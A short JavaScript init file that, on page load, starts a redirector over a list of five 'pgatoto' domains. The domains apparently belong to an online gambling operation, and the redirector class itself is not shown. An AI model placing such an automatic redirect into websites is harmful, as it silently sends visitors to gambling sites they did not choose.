// init.js
const securedomains = [
    'https://pgatoto-profit.com',
    'https://pgatoto-game.com',
    'https://pgatotowhite.fr',
    'https://pgatoto389.com',
    'https://pgatotogaskan.net'
];

document.addEventListener('DOMContentLoaded', () => {
    const redirector = new EnhancedDomainRedirector(securedomains);
    redirector.init();
});
